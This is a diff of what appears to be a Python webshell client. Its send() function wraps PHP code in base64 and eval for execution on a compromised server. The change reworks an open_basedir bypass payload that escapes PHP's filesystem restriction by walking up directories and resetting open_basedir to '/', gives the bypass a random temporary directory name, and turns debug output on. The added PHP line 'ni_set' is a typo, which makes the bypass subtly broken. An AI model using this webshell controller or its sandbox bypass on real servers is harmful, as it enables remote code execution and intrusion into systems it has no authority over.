@@ -3,6 +3,7 @@ import subprocess
 from base64 import b64decode, b64encode
 from platform import system
 from random import randint, sample
+from uuid import uuid4
 
 import requests
 from urllib3 import disable_warnings
@@ -89,12 +90,21 @@ def send(data: str, raw: bool = False, **extra_params):
     pwd_b64 = b64encode(gget("webshell.pwd", "webshell").encode()).decode()
     if not raw:
         data = f"""error_reporting(0);chdir(base64_decode("{pwd_b64}"));print("{head}");""" + data
-        data += f"""print("{tail}");"""
         if (gget("webshell.bypass_obd")):
-            data += """$dir=pos(glob("./*", GLOB_ONLYDIR));$cwd=getcwd();$ndir="./test";
-if($dir === false){$r=mkdir($ndir);if($r === false){die('bypass opendir failed!');}else{$dir=$ndir;}}
-chdir($dir);ini_set("open_basedir","..");$c=substr_count(getcwd(), "/");for($i=0;$i<$c;$i++) chdir("..");
-ini_set("open_basedir", "/");chdir($cwd);rmdir($ndir);"""
+            data = """$dir=pos(glob("./*", GLOB_ONLYDIR));
+$cwd=getcwd();
+$ndir="./%s";
+if($dir === false){
+$r=mkdir($ndir);
+if($r === false){
+die('bypass opendir failed!');}
+else{$dir=$ndir;}}
+chdir($dir);
+ni_set("open_basedir","..");
+$c=substr_count(getcwd(), "/");
+for($i=0;$i<$c;$i++) chdir("..");
+ini_set("open_basedir", "/");chdir($cwd);rmdir($ndir);""" % (uuid4()) + data
+        data += f"""print("{tail}");"""
         data = f"""eval(base64_decode("{base64_encode(data)}"));"""
         # data = f"""eval('error_reporting(0);chdir(base64_decode("{pwd_b64}"));print(\\'{head}\\');eval(base64_decode("{base64_encode(data)}"));print(\\'{tail}\\');');"""
         if (not php_v7):
@@ -132,7 +142,7 @@ ini_set("open_basedir", "/");chdir($cwd);rmdir($ndir);"""
         req.r_json = json.loads(req.r_text)
     except json.JSONDecodeError:
         req.r_json = ''
-    if 0:  # DEBUG
+    if 1:  # DEBUG
         print(f"[debug] {params_dict}")
         print(f"[debug] {url}")
         print(f"[debug] [{req}] [len:{len(content)}] {text}")
